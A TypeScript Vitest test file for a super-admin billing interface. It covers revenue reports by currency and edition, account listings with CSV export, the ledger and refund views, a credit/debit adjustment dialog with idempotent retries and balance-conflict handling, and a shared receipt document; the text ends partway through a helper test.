/**
 * Super Admin billing screens (phase 6, docs/billing/SIMPLE_BILLING.md):
 * Finance → Revenue and Accounts, the account detail with its ledger,
 * payments, refunds and receipts, the credit/debit dialog's safeguards, the
 * receipt document shared with the customer page, and every phase-6
 * translation key in fa, en and tr.
 *
 * The API client and its React Query hooks are real; only `fetch` is faked,
 * so each test also checks what the screens ask the server for.
 */
import { describe, it, expect, vi, beforeAll, beforeEach } from 'vitest';
import { existsSync, readFileSync } from 'node:fs';
import { join } from 'node:path';
import { render, screen, waitFor, fireEvent, within, act } from '@testing-library/react';
import { MemoryRouter, Routes, Route, useLocation } from 'react-router-dom';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import type { ReactNode } from 'react';

const state = vi.hoisted(() => ({ locale: 'en' as 'en' | 'fa' | 'tr', edition: 'international' as 'iran' | 'international' }));

vi.mock('@/i18n', async () => {
  const dicts = {
    en: (await import('@/i18n/locales/en')).default,
    fa: (await import('@/i18n/locales/fa')).default,
    tr: (await import('@/i18n/locales/tr')).default,
  } as Record<string, unknown>;
  const lookup = (dict: unknown, key: string): unknown =>
    key.split('.').reduce<unknown>((node, part) => (node && typeof node === 'object' ? (node as Record<string, unknown>)[part] : undefined), dict);
  const t = (key: string, vars?: Record<string, string | number>) => {
    const value = lookup(dicts[state.locale], key);
    if (typeof value !== 'string') return key;
    return value.replace(/\{\{(\w+)\}\}/g, (_, name: string) => (vars && name in vars ? String(vars[name]) : `{{${name}}}`));
  };
  return {
    useTranslation: () => ({ t, locale: state.locale, dir: state.locale === 'fa' ? 'rtl' : 'ltr' }),
  };
});
vi.mock('@/lib/edition', async (orig) => ({ ...(await orig<object>()), currentEdition: () => state.edition }));
const toastMock = vi.hoisted(() => ({ success: vi.fn(), error: vi.fn() }));
vi.mock('@/lib/toast', () => ({ toast: toastMock }));

import en from '@/i18n/locales/en';
import fa from '@/i18n/locales/fa';
import tr from '@/i18n/locales/tr';
import { bucketRevenue, type AdminAccountDetail, type RevenueReport } from '../../../../shared/simpleBillingAdmin';

const AccountsTab = (await import('@/pages/admin/finance/AccountsTab')).default;
const AccountDetailPage = (await import('@/pages/admin/finance/AccountDetailPage')).default;
const RevenueTab = (await import('@/pages/admin/finance/RevenueTab')).default;
const ReceiptDocument = (await import('@/pages/app/billing/account/ReceiptDocument')).default;
const ui = await import('@/pages/admin/finance/financeUi');

beforeAll(() => {
  (globalThis as { ResizeObserver?: unknown }).ResizeObserver ??= class {
    observe() {}
    unobserve() {}
    disconnect() {}
  };
  const proto = window.HTMLElement.prototype as unknown as Record<string, unknown>;
  proto.hasPointerCapture ??= () => false;
  proto.releasePointerCapture ??= () => undefined;
  proto.scrollIntoView ??= () => undefined;
});

// ─── Fake server ───────────────────────────────────────────────────────────

const WS = '11111111-2222-4333-8444-555555555555';
const OWNER = '99999999-8888-4777-8666-555555555555';

type Handler = (url: URL, init: RequestInit | undefined) => { status?: number; body: unknown } | Promise<{ status?: number; body: unknown }>;
const routes: Array<{ method: string; path: RegExp; handler: Handler }> = [];
const calls: Array<{ method: string; url: URL; body: unknown }> = [];

function on(method: string, path: RegExp, handler: Handler) {
  routes.unshift({ method, path, handler });
}

const fetchMock = vi.fn(async (input: RequestInfo | URL, init?: RequestInit) => {
  const url = new URL(String(input), 'http://localhost');
  const method = (init?.method ?? 'GET').toUpperCase();
  calls.push({ method, url, body: init?.body ? JSON.parse(String(init.body)) : undefined });
  const path = url.pathname.replace(/^.*\/api\/admin\/simple-billing/, '');
  const route = routes.find((r) => r.method === method && r.path.test(path));
  if (!route) return new Response(JSON.stringify({ error: 'NOT_MOCKED', path }), { status: 500 });
  const out = await route.handler(url, init);
  return new Response(JSON.stringify(out.body), { status: out.status ?? 200, headers: { 'Content-Type': 'application/json' } });
});

function account(over: Partial<AdminAccountDetail> = {}): AdminAccountDetail {
  return {
    workspace: { id: WS, name: 'Acme', slug: 'acme', owner: { id: OWNER, email: 'owner@acme.test' } },
    has_account: true,
    edition: 'international',
    currency: 'USD',
    balance_minor: 2500,
    auto_renew: false,
    next_period_prepaid_minor: null,
    next_period_start: null,
    scheduled: null,
    plan: {
      plan_id: 'p1', slug: 'pro', name: 'Pro', localized: {}, is_free: false, status: 'active', billing_interval: 'monthly',
      current_period_start: '2026-09-10T00:00:00Z', current_period_end: '2026-10-10T00:00:00Z', trial_end: null,
    },
    due_unprocessed: true,
    card: null,
    billing_profile: { company: 'Acme Ltd' },
    vat_percent: null,
    account_created_at: '2026-09-01T00:00:00Z',
    ...over,
  };
}

const LEDGER_ROW = {
  id: 'l-admin', kind: 'admin_credit', amount_minor: 1000, balance_after: 2500, currency: 'USD', plan_id: null, billing_interval: null,
  period_start: null, period_end: null, payment_id: null, receipt_number: null, net_minor: null, tax_minor: null, tax_percent: null,
  buyer: null, seller: null, description: { reason: 'Outage on 3 October', category: 'compensation' }, created_at: '2026-10-05T10:00:00Z',
  actor_id: OWNER, actor_email: 'admin@platform.test',
};
const TOPUP_ROW = {
  id: 'l-topup', kind: 'topup', amount_minor: 1500, balance_after: 1500, currency: 'USD', plan_id: null, billing_interval: null,
  period_start: null, period_end: null, payment_id: 'pay-1', receipt_number: 'RS2026-000042', net_minor: 1500, tax_minor: 0, tax_percent: null,
  buyer: { company: 'Acme Ltd' }, seller: { legal_name: 'Platform Inc.' }, description: { provider: 'paddle', provider_name: { en: 'Card (Paddle)' } },
  created_at: '2026-10-01T09:00:00Z',
};
const PAYMENT = {
  id: 'pay-1', provider: 'paddle', is_test: false, source: 'checkout', purpose: 'topup', purpose_result: null, status: 'succeeded',
  currency: 'USD', amount_minor: 1500, net_minor: 1500, tax_minor: 0, tax_percent: null, refunded_minor: 500,
  refunds: [{ refund_id: 're_1', amount_minor: 500, credit_minor: 500, shortfall_minor: 0, released_prepaid_minor: 0, pack_returned_minor: 0, refunded_at: '2026-10-06T12:00:00Z' }],
  failure_reason: null, provider_ref: 'txn_1', provider_payment_id: null, ledger_id: 'l-topup', card_id: null, review: 'amount_mismatch',
  created_at: '2026-10-01T08:59:00Z', completed_at: '2026-10-01T09:00:00Z',
};

function accountRow(over: Record<string, unknown> = {}) {
  return {
    workspace_id: WS, name: 'Acme', slug: 'acme', workspace_status: 'active', owner_id: OWNER, owner_email: 'owner@acme.test',
    has_account: true, currency: 'USD', balance_minor: 2500, auto_renew: true, next_period_prepaid_minor: 900, next_period_start: null,
    scheduled_plan_id: null, scheduled_interval: null, plan_id: 'p1', plan_name: 'Pro', plan_localized: {}, is_free: false,
    status: 'active', billing_interval: 'monthly', current_period_end: new Date(Date.now() + 2 * 86_400_000).toISOString(),
    trial_end: null, card_status: 'past_due', last_payment_at: '2026-10-01T09:00:00Z', ledger_count: 2, account_created_at: null,
    ...over,
  };
}

function report(edition: 'iran' | 'international', currencies: string[], days: Parameters<typeof bucketRevenue>[0]['days'] = []): RevenueReport {
  return bucketRevenue({
    edition,
    today: '2026-10-11',
    months: 12,
    includeTest: false,
    isTest: (p) => p.endsWith('_test') || p === 'paddle_sandbox',
    days,
    ledgerDays: [{ day: '2026-10-05', currency: currencies[0], kind: 'admin_credit', count: 1, in_minor: 1000, out_minor: 0 }],
    liability: currencies.map((c) => ({ currency: c, accounts: 3, positive_accounts: 2, balance_minor: 5000, prepaid_minor: 900 })),
    currencies,
  });
}

function Where() {
  const loc = useLocation();
  return <div data-testid="where">{loc.pathname}{loc.search}</div>;
}

function renderWith(node: ReactNode, url = '/admin/finance?tab=accounts') {
  const client = new QueryClient({ defaultOptions: { queries: { retry: false }, mutations: { retry: false } } });
  return render(
    <QueryClientProvider client={client}>
      <MemoryRouter initialEntries={[url]}>
        <Routes>
          <Route path="/admin/finance" element={<>{node}<Where /></>} />
          <Route path="/admin/finance/accounts/:workspaceId" element={<><AccountDetailPage /><Where /></>} />
        </Routes>
      </MemoryRouter>
    </QueryClientProvider>,
  );
}

/** Opens a Radix select and picks the option with this text. */
async function choose(trigger: HTMLElement, option: string) {
  trigger.focus();
  fireEvent.keyDown(trigger, { key: 'Enter' });
  fireEvent.click(await screen.findByRole('option', { name: option }));
}

beforeEach(() => {
  state.locale = 'en';
  state.edition = 'international';
  routes.length = 0;
  calls.length = 0;
  fetchMock.mockClear();
  toastMock.success.mockReset();
  toastMock.error.mockReset();
  vi.stubGlobal('fetch', fetchMock);
  on('GET', /^\/revenue$/, () => ({ body: report('international', ['USD', 'TRY']) }));
  on('GET', /^\/accounts$/, () => ({ body: { edition: 'international', currencies: ['USD', 'TRY'], total: 1, page: 1, pageSize: 25, items: [accountRow()] } }));
  on('GET', /^\/accounts\/[^/]+$/, () => ({ body: account() }));
  on('GET', /^\/accounts\/[^/]+\/ledger$/, () => ({ body: { items: [LEDGER_ROW, TOPUP_ROW], total: 2, page: 1, pageSize: 20 } }));
  on('GET', /^\/accounts\/[^/]+\/payments$/, () => ({ body: { items: [PAYMENT], total: 1, page: 1, pageSize: 20 } }));
  on('GET', /^\/accounts\/[^/]+\/receipts\/l-topup$/, () => ({ body: { receipt: TOPUP_ROW } }));
});

const accountsCalls = () => calls.filter((c) => c.method === 'GET' && c.url.pathname.endsWith('/accounts'));

// ─── Finance page ──────────────────────────────────────────────────────────

describe('Finance page tabs', () => {
  it('lists revenue, accounts, card to card (Iran only), gateways, ai, audit while billing v2 is hidden; revenue is the default', () => {
    const src = readFileSync(join(process.cwd(), 'src', 'pages', 'admin', 'FinancePage.tsx'), 'utf8');
    expect(src).toContain("['revenue', 'accounts', 'cardTransfers', 'gateways', 'ai', 'audit']");
    expect(src).toContain("key !== 'cardTransfers' || isIran");
    expect(src).toMatch(/<TabsContent value="revenue"[^>]*><RevenueTab \/>/);
    expect(src).toMatch(/<TabsContent value="accounts"[^>]*><AccountsTab \/>/);
  });

  it('routes the account detail and sends /admin/billing to the accounts tab', () => {
    const app = readFileSync(join(process.cwd(), 'src', 'App.tsx'), 'utf8');
    expect(app).toContain('path="/admin/finance/accounts/:workspaceId" element={<AdminAccountDetailPage />}');
    expect(app).toContain('"/admin/finance?tab=accounts"');
  });

  it('has no billing v2 ledger tabs or danger zone (removed in phase 7A)', () => {
    expect(existsSync(join(process.cwd(), 'src', 'pages', 'admin', 'finance', 'FinanceLedgerTabs.tsx'))).toBe(false);
    const src = readFileSync(join(process.cwd(), 'src', 'pages', 'admin', 'FinancePage.tsx'), 'utf8');
    expect(src).not.toMatch(/FinanceDangerZone|LEGACY_BILLING_/);
  });

  it('puts the gateway readiness card on top of Finance → Gateways', () => {
    const src = readFileSync(join(process.cwd(), 'src', 'pages', 'admin', 'finance', 'FinanceConfigTabs.tsx'), 'utf8');
    expect(src).toContain("import GatewaysReadinessCard from './GatewaysReadinessCard';");
    expect(src).toContain('<GatewaysReadinessCard refreshKey=');
  });
});

// ─── Accounts ──────────────────────────────────────────────────────────────

describe('Accounts tab', () => {
  it('renders the row, the liability per currency, and asks for accounts with the default filter and sort', async () => {
    renderWith(<AccountsTab />);
    const row = await screen.findByTestId(`account-row-${WS}`);
    expect(within(row).getByText('Acme')).toBeInTheDocument();
    expect(within(row).getByText('owner@acme.test')).toBeInTheDocument();
    expect(within(row).getByText('$25.00')).toBeInTheDocument();
    expect(within(row).getByText('Prepaid')).toBeInTheDocument();
    expect(within(row).getByText('Card past due')).toBeInTheDocument();
    expect(screen.getByText('Outstanding balances (USD)')).toBeInTheDocument();
    expect(screen.getByText('Outstanding balances (TRY)')).toBeInTheDocument();
    const first = accountsCalls()[0].url.searchParams;
    expect(first.get('filter')).toBe('with_account');
    expect(first.get('sort')).toBe('balance_desc');
    expect(first.get('q')).toBeNull();
    // The liability comes from the cached revenue report of one month.
    expect(calls.some((c) => c.url.pathname.endsWith('/revenue') && c.url.searchParams.get('months') === '1')).toBe(true);
  });

  it('searches only after typing pauses', async () => {
    renderWith(<AccountsTab />);
    await screen.findByTestId(`account-row-${WS}`);
    const before = accountsCalls().length;
    fireEvent.change(screen.getByLabelText(/Search by name/), { target: { value: 'acm' } });
    fireEvent.change(screen.getByLabelText(/Search by name/), { target: { value: 'acme' } });
    expect(accountsCalls().length).toBe(before);
    await waitFor(() => expect(accountsCalls().some((c) => c.url.searchParams.get('q') === 'acme')).toBe(true));
    expect(accountsCalls().some((c) => c.url.searchParams.get('q') === 'acm')).toBe(false);
  });

  it('filters and sorts through the selects', async () => {
    renderWith(<AccountsTab />);
    await screen.findByTestId(`account-row-${WS}`);
    await choose(screen.getByLabelText('Show'), 'All workspaces');
    await waitFor(() => expect(accountsCalls().some((c) => c.url.searchParams.get('filter') === 'all')).toBe(true));
    await choose(screen.getByLabelText('Sort by'), 'Period ends soonest');
    await waitFor(() => expect(accountsCalls().some((c) => c.url.searchParams.get('sort') === 'period_end_asc')).toBe(true));
    await choose(screen.getByLabelText('Currency'), 'TRY');
    await waitFor(() => expect(accountsCalls().some((c) => c.url.searchParams.get('currency') === 'TRY')).toBe(true));
  });

  it('the CSV holds every matching workspace, not the page on screen', async () => {
    const TOTAL = 230;
    const rowAt = (i: number) => accountRow({ workspace_id: `00000000-0000-4000-8000-${String(i).padStart(12, '0')}`, name: `WS ${i}` });
    on('GET', /^\/accounts$/, (url) => {
      const page = Number(url.searchParams.get('page') ?? 1);
      const size = Number(url.searchParams.get('pageSize') ?? 25);
      const from = (page - 1) * size;
      const items = Array.from({ length: Math.max(0, Math.min(size, TOTAL - from)) }, (_, k) => rowAt(from + k));
      return { body: { edition: 'international', currencies: ['USD'], total: TOTAL, page, pageSize: size, items } };
    });
    const blobs: Blob[] = [];
    const urlApi = URL as unknown as { createObjectURL?: unknown; revokeObjectURL?: unknown };
    const saved = { create: urlApi.createObjectURL, revoke: urlApi.revokeObjectURL };
    urlApi.createObjectURL = vi.fn((b: Blob) => { blobs.push(b); return 'blob:csv'; });
    urlApi.revokeObjectURL = vi.fn();
    const click = vi.spyOn(HTMLAnchorElement.prototype, 'click').mockImplementation(() => {});
    try {
      renderWith(<AccountsTab />);
      await screen.findByText('WS 0');
      fireEvent.click(screen.getByRole('button', { name: 'CSV' }));
      await waitFor(() => expect(blobs).toHaveLength(1));
      const text = await new Promise<string>((resolve) => {
        const reader = new FileReader();
        reader.onload = () => resolve(String(reader.result));
        reader.readAsText(blobs[0]);
      });
      const lines = text.replace(/^\uFEFF/, '').split('\r\n');
      expect(lines).toHaveLength(1 + TOTAL);
      expect(lines.at(-1)).toContain('WS 229');
      const pages = accountsCalls().filter((c) => c.url.searchParams.get('pageSize') === '100');
      expect(pages.map((c) => c.url.searchParams.get('page'))).toEqual(['1', '2', '3']);
      expect(pages.every((c) => c.url.searchParams.get('filter') === 'with_account' && c.url.searchParams.get('sort') === 'balance_desc')).toBe(true);
    } finally {
      urlApi.createObjectURL = saved.create;
      urlApi.revokeObjectURL = saved.revoke;
      click.mockRestore();
    }
  });

  it('shows a workspace without an account and opens the detail on click', async () => {
    on('GET', /^\/accounts$/, () => ({
      body: { edition: 'international', currencies: ['USD'], total: 1, page: 1, pageSize: 25, items: [accountRow({ has_account: false, currency: null, balance_minor: 0, card_status: null, next_period_prepaid_minor: null })] },
    }));
    renderWith(<AccountsTab />);
    const row = await screen.findByTestId(`account-row-${WS}`);
    expect(within(row).getByText('No account yet')).toBeInTheDocument();
    // One currency: no currency select.
    expect(screen.queryByLabelText('Currency')).not.toBeInTheDocument();
    fireEvent.click(row);
    await waitFor(() => expect(screen.getByTestId('where').textContent).toBe(`/admin/finance/accounts/${WS}`));
  });
});

// ─── Account detail ────────────────────────────────────────────────────────

describe('Account detail', () => {
  it('renders balance, plan with the due badge, ledger with the admin reason and actor; it only reads', async () => {
    renderWith(null, `/admin/finance/accounts/${WS}`);
    expect(await screen.findByTestId('detail-balance')).toHaveTextContent('$25.00');
    expect(screen.getByTestId('due-unprocessed')).toHaveTextContent('Due, waits for the job');
    expect(screen.getByText('Acme Ltd')).toBeInTheDocument();
    expect(screen.getByRole('link', { name: 'Change plan' })).toHaveAttribute('href', `/admin/plans?tab=assign&workspace=${WS}`);
    const adminRow = await screen.findByTestId('ledger-row-l-admin');
    expect(within(adminRow).getByText('Admin credit')).toBeInTheDocument();
    expect(within(adminRow).getByText('Compensation')).toBeInTheDocument();
    expect(within(adminRow).getByText('Outage on 3 October')).toBeInTheDocument();
    expect(within(adminRow).getByText('admin@platform.test')).toBeInTheDocument();
    expect(calls.every((c) => c.method === 'GET')).toBe(true);
  });

  it('opens a receipt in a dialog with the same document the customer prints', async () => {
    renderWith(null, `/admin/finance/accounts/${WS}`);
    const row = await screen.findByTestId('ledger-row-l-topup');
    fireEvent.click(within(row).getByRole('button', { name: /Receipt/ }));
    const dialog = await screen.findByRole('dialog');
    expect(await within(dialog).findByText('RS2026-000042')).toBeInTheDocument();
    expect(within(dialog).getByText('Platform Inc.')).toBeInTheDocument();
    expect(within(dialog).getByRole('button', { name: /Print/ })).toBeInTheDocument();
    // Paid through Paddle: the buyer's tax is on Paddle's invoice, said on the receipt.
    expect(dialog.querySelector('[data-receipt-paddle-tax]')).toHaveTextContent(/collected by Paddle/);
  });

  it('lists payments with the review badge and expands their refunds', async () => {
    renderWith(null, `/admin/finance/accounts/${WS}`);
    await screen.findByTestId('detail-balance');
    fireEvent.mouseDown(screen.getByRole('tab', { name: 'Payments' }), { button: 0 });
    const row = await screen.findByTestId('payment-row-pay-1');
    expect(within(row).getByText('Needs review')).toBeInTheDocument();
    expect(within(row).getByText('Succeeded')).toBeInTheDocument();
    fireEvent.click(within(row).getByRole('button', { name: 'Show refunds' }));
    expect(await screen.findByText('re_1')).toBeInTheDocument();
    expect(screen.getByText('Refunded on')).toBeInTheDocument();
  });

  it('says when the workspace does not exist', async () => {
    on('GET', /^\/accounts\/[^/]+$/, () => ({ status: 404, body: { error: 'NOT_FOUND' } }));
    renderWith(null, `/admin/finance/accounts/${WS}`);
    expect(await screen.findByText('This workspace does not exist.')).toBeInTheDocument();
  });
});

// ─── Credit and debit ──────────────────────────────────────────────────────

async function openAdjust(direction: 'Credit' | 'Debit') {
  renderWith(null, `/admin/finance/accounts/${WS}`);
  await screen.findByTestId('detail-balance');
  fireEvent.click(screen.getByRole('button', { name: direction }));
  return screen.findByRole('dialog');
}

async function fillForm(dialog: HTMLElement, amount: string, reason = 'Goodwill after outage') {
  fireEvent.change(within(dialog).getByLabelText(/Amount/), { target: { value: amount } });
  await choose(within(dialog).getByLabelText('Category'), 'Goodwill');
  fireEvent.change(within(dialog).getByLabelText('Reason'), { target: { value: reason } });
}

describe('Adjust dialog', () => {
  it('refuses a debit above the balance and a reason that is too short', async () => {
    const dialog = await openAdjust('Debit');
    await fillForm(dialog, '30');
    expect(within(dialog).getByText('A debit cannot take the balance below zero.')).toBeInTheDocument();
    expect(within(dialog).getByRole('button', { name: 'Review' })).toBeDisabled();
    fireEvent.change(within(dialog).getByLabelText(/Amount/), { target: { value: '10' } });
    fireEvent.change(within(dialog).getByLabelText('Reason'), { target: { value: 'ok' } });
    expect(within(dialog).getByRole('button', { name: 'Review' })).toBeDisabled();
    fireEvent.change(within(dialog).getByLabelText('Reason'), { target: { value: 'Duplicate credit' } });
    expect(within(dialog).getByRole('button', { name: 'Review' })).toBeEnabled();
    expect(within(dialog).getByTestId('adjust-after')).toHaveTextContent('$15.00');
  });

  it('confirms with the new balance and sends the server what it showed', async () => {
    let body: Record<string, unknown> | null = null;
    on('POST', /\/adjust$/, (_url, init) => {
      body = JSON.parse(String(init?.body));
      return { body: { replayed: false, ledger_id: 'l-new', balance_minor: 3500, account: account({ balance_minor: 3500 }) } };
    });
    const dialog = await openAdjust('Credit');
    await fillForm(dialog, '10');
    fireEvent.click(within(dialog).getByRole('button', { name: 'Review' }));
    expect(await within(dialog).findByTestId('adjust-confirm-after')).toHaveTextContent('$35.00');
    expect(within(dialog).getByText(/Acme: \+\$10\.00 in USD\. The balance becomes \$35\.00\./)).toBeInTheDocument();
    fireEvent.click(within(dialog).getByRole('button', { name: 'Confirm credit' }));
    await waitFor(() => expect(toastMock.success).toHaveBeenCalledWith('Done. The balance is now $35.00.'));
    expect(body).toMatchObject({
      direction: 'credit', amountMinor: 1000, currency: 'USD', reason: 'Goodwill after outage', category: 'goodwill', expectedBalanceMinor: 2500,
    });
    expect(body).not.toHaveProperty('actorId');
    expect(String((body as unknown as { commandKey: string }).commandKey)).toMatch(/^[0-9a-f-]{36}$/);
  });

  it('retries a lost answer with the same command key', async () => {
    const keys: string[] = [];
    let attempt = 0;
    on('POST', /\/adjust$/, (_url, init) => {
      keys.push(JSON.parse(String(init?.body)).commandKey);
      attempt += 1;
      if (attempt === 1) return { status: 502, body: {} };
      return { body: { replayed: true, ledger_id: 'l-new', balance_minor: 3500, account: account({ balance_minor: 3500 }) } };
    });
    const dialog = await openAdjust('Credit');
    await fillForm(dialog, '10');
    fireEvent.click(within(dialog).getByRole('button', { name: 'Review' }));
    fireEvent.click(await within(dialog).findByRole('button', { name: 'Confirm credit' }));
    expect(await within(dialog).findByText('The change was not saved.')).toBeInTheDocument();
    fireEvent.click(within(dialog).getByRole('button', { name: 'Confirm credit' }));
    await waitFor(() => expect(toastMock.success).toHaveBeenCalledWith('This change was already saved. The balance is $35.00.'));
    expect(keys).toHaveLength(2);
    expect(keys[0]).toBe(keys[1]);
  });

  it('BALANCE_CHANGED refreshes the account, asks again and uses a new key', async () => {
    const keys: string[] = [];
    const expected: number[] = [];
    let attempt = 0;
    on('POST', /\/adjust$/, (_url, init) => {
      const b = JSON.parse(String(init?.body));
      keys.push(b.commandKey);
      expected.push(b.expectedBalanceMinor);
      attempt += 1;
      if (attempt === 1) return { status: 409, body: { error: 'BALANCE_CHANGED', account: account({ balance_minor: 4000 }) } };
      return { body: { replayed: false, ledger_id: 'l-new', balance_minor: 5000, account: account({ balance_minor: 5000 }) } };
    });
    const dialog = await openAdjust('Credit');
    await fillForm(dialog, '10');
    fireEvent.click(within(dialog).getByRole('button', { name: 'Review' }));
    fireEvent.click(await within(dialog).findByRole('button', { name: 'Confirm credit' }));
    expect(await within(dialog).findByText('The balance changed to $40.00 meanwhile. Check the amount and confirm again.')).toBeInTheDocument();
    // The page's balance is the fresh one, and so is the dialog's preview.
    expect(screen.getByTestId('detail-balance')).toHaveTextContent('$40.00');
    expect(within(dialog).getByTestId('adjust-after')).toHaveTextContent('$50.00');
    fireEvent.click(within(dialog).getByRole('button', { name: 'Review' }));
    fireEvent.click(await within(dialog).findByRole('button', { name: 'Confirm credit' }));
    await waitFor(() => expect(toastMock.success).toHaveBeenCalled());
    expect(expected).toEqual([2500, 4000]);
    expect(keys[0]).not.toBe(keys[1]);
  });

  it('a refused debit shows inline and too many adjustments show a toast', async () => {
    let attempt = 0;
    on('POST', /\/adjust$/, () => {
      attempt += 1;
      return attempt === 1
        ? { status: 409, body: { error: 'INSUFFICIENT_BALANCE' } }
        : { status: 429, body: { error: 'TOO_MANY_ADJUSTMENTS' } };
    });
    const dialog = await openAdjust('Debit');
    await fillForm(dialog, '5', 'Duplicate credit');
    fireEvent.click(within(dialog).getByRole('button', { name: 'Review' }));
    fireEvent.click(await within(dialog).findByRole('button', { name: 'Confirm debit' }));
    expect(await within(dialog).findByText('The balance is too low for this debit.')).toBeInTheDocument();
    fireEvent.click(within(dialog).getByRole('button', { name: 'Confirm debit' }));
    await waitFor(() => expect(toastMock.error).toHaveBeenCalledWith('Too many adjustments in the last hour. Try again later.'));
  });
});

// ─── Revenue ───────────────────────────────────────────────────────────────

describe('Revenue tab', () => {
  it('shows Jalali months and Toman in the Iranian edition, in Persian, with the footnotes', async () => {
    state.locale = 'fa';
    state.edition = 'iran';
    on('GET', /^\/revenue$/, () => ({
      body: report('iran', ['IRR'], [
        { day: '2026-10-01', metric: 'payment', currency: 'IRR', provider: 'zarinpal', source: 'checkout', purpose: 'topup', count: 2, gross_minor: 2_180_000, tax_minor: 180_000, net_minor: 2_000_000 },
        { day: '2026-09-20', metric: 'payment', currency: 'IRR', provider: 'zarinpal', source: 'checkout', purpose: 'renewal', count: 1, gross_minor: 1_090_000, tax_minor: 90_000, net_minor: 1_000_000 },
      ]),
    }));
    renderWith(<RevenueTab />, '/admin/finance?tab=revenue');
    const section = await screen.findByTestId('revenue-section-IRR');
    // 2026-10-01 is 9 Mehr 1405; 2026-09-20 is 29 Shahrivar 1405.
    expect(within(section).getAllByText(/مهر ۱۴۰۵/).length).toBeGreaterThan(0);
    expect(within(section).getAllByText(/شهریور ۱۴۰۵/).length).toBeGreaterThan(0);
    expect(within(section).getAllByText(/۲۰۰٬۰۰۰ تومان/).length).toBeGreaterThan(0);
    expect(screen.queryByTestId('revenue-section-USD')).not.toBeInTheDocument();
    expect(screen.getByText(fa.admin.simpleBilling.revenue.footnote.chargeback)).toBeInTheDocument();
    expect(screen.getByText(fa.admin.simpleBilling.revenue.footnote.paddle)).toBeInTheDocument();
    expect(screen.getByText(fa.admin.simpleBilling.revenue.footnote.refundMonth)).toBeInTheDocument();
    expect(screen.getByText(fa.admin.simpleBilling.revenue.footnote.purged)).toBeInTheDocument();
  });

  it('year to date never falls back to a shorter report: while the 12-month report fails it says so, with a retry', async () => {
    let failYear = true;
    on('GET', /^\/revenue$/, (url) => {
      if (url.searchParams.get('months') === '12' && failYear) return { status: 500, body: { error: 'TIMEOUT' } };
      return {
        body: report('international', ['USD'], [
          // January is in this year but outside a 6-month report.
          { day: '2026-01-15', metric: 'payment' as const, currency: 'USD', provider: 'paddle', source: 'checkout', purpose: 'topup', count: 1, gross_minor: 70000, tax_minor: 0, net_minor: 70000 },
          { day: '2026-10-02', metric: 'payment' as const, currency: 'USD', provider: 'paddle', source: 'checkout', purpose: 'topup', count: 1, gross_minor: 2000, tax_minor: 0, net_minor: 2000 },
        ].filter((d) => url.searchParams.get('months') === '12' || d.day >= '2026-05-01')),
      };
    });
    renderWith(<RevenueTab />, '/admin/finance?tab=revenue');
    await screen.findByText(en.admin.simpleBilling.common.loadFailed);
    await choose(screen.getByLabelText(en.admin.simpleBilling.revenue.months), 'Last 6 months');
    const usd = await screen.findByTestId('revenue-section-USD');
    const failed = within(usd).getByTestId('revenue-ytd-failed-USD');
    expect(failed.textContent).toContain(en.admin.simpleBilling.revenue.ytdFailed);
    failYear = false;
    fireEvent.click(within(failed).getByRole('button', { name: en.admin.simpleBilling.common.retry }));
    // The real year to date: January's $700 plus October's $20.
    await waitFor(() => expect(within(usd).getAllByText('$720.00').length).toBeGreaterThan(0));
  });

  it('has one section per currency abroad, Gregorian months, and the include-test switch', async () => {
    on('GET', /^\/revenue$/, (url) => ({
      body: report('international', ['USD', 'TRY'], [
        { day: '2026-10-02', metric: 'payment', currency: 'USD', provider: 'paddle', source: 'checkout', purpose: 'topup', count: 1, gross_minor: 2000, tax_minor: 0, net_minor: 2000 },
        { day: '2026-10-03', metric: 'payment', currency: 'TRY', provider: 'iyzico', source: 'checkout', purpose: 'topup', count: 1, gross_minor: 50000, tax_minor: 0, net_minor: 50000 },
        { day: '2026-10-04', metric: 'refund', currency: 'USD', provider: 'paddle', source: 'checkout', purpose: 'topup', count: 1, gross_minor: 500, tax_minor: 0, net_minor: 500 },
        ...(url.searchParams.get('includeTest') === '1'
          ? [{ day: '2026-10-02', metric: 'payment' as const, currency: 'USD', provider: 'paddle_sandbox', source: 'checkout', purpose: 'topup', count: 1, gross_minor: 100, tax_minor: 0, net_minor: 100 }]
          : []),
      ]),
    }));
    renderWith(<RevenueTab />, '/admin/finance?tab=revenue');
    const usd = await screen.findByTestId('revenue-section-USD');
    const tryS = screen.getByTestId('revenue-section-TRY');
    expect(within(usd).getAllByText(/October 2026/).length).toBeGreaterThan(0);
    // Net after refunds: $20.00 − $5.00, never mixed with lira.
    expect(within(usd).getAllByText('$15.00').length).toBeGreaterThan(0);
    expect(within(tryS).queryByText('$15.00')).not.toBeInTheDocument();
    expect(calls.filter((c) => c.url.pathname.endsWith('/revenue')).every((c) => c.url.searchParams.get('includeTest') !== '1')).toBe(true);
    await act(async () => {
      fireEvent.click(screen.getByLabelText('Include test gateways'));
    });
    await waitFor(() => expect(calls.some((c) => c.url.pathname.endsWith('/revenue') && c.url.searchParams.get('includeTest') === '1')).toBe(true));
  });
});

// ─── Receipt document ──────────────────────────────────────────────────────

describe('ReceiptDocument', () => {
  it('prints seller, buyer, the item and the total from the frozen row', () => {
    render(<ReceiptDocument receipt={{ ...TOPUP_ROW, net_minor: 1000, tax_minor: 100, tax_percent: 10 } as never} locale="en" dir="ltr" />);
    expect(screen.getByText('RS2026-000042')).toBeInTheDocument();
    expect(screen.getByText('Platform Inc.')).toBeInTheDocument();
    expect(screen.getByText('Acme Ltd')).toBeInTheDocument();
    // The total heads the sheet and closes the totals.
    expect(screen.getAllByText('$11.00')).toHaveLength(2);
    expect(screen.getByText('$1.00')).toBeInTheDocument();
    expect(screen.getByText('Paid')).toBeInTheDocument();
    expect(screen.getByText('pay-1')).toBeInTheDocument();
  });

  it('heads the sheet with the edition\'s logo, always on a light sheet', () => {
    const src = readFileSync(join(process.cwd(), 'src', 'pages', 'app', 'billing', 'account', 'ReceiptDocument.tsx'), 'utf8');
    expect(src).toContain('INTL_BRAND.horizontal.light');
    expect(src).toContain('WEBYAR_BRAND.logo.light');
    expect(src).toContain('bg-white text-slate-900');
  });

  it('is what the customer receipt page renders', () => {
    const src = readFileSync(join(process.cwd(), 'src', 'pages', 'app', 'billing', 'account', 'ReceiptPage.tsx'), 'utf8');
    expect(src).toContain('<ReceiptDocument receipt={receipt} locale={locale} dir={dir} />');
  });
});

// ─── Helpers ───────────────────────────────────────────────────────────────

describe('finance helpers', () => {
  const t = ((k: string) => {
    const v = k.split('.').reduce<unknown>((n, p) => (n && typeof n === 'object' ? (n as Record<string, unknown>)[p] : undefined), en);
    return typeof v === 'string' ? v : k;
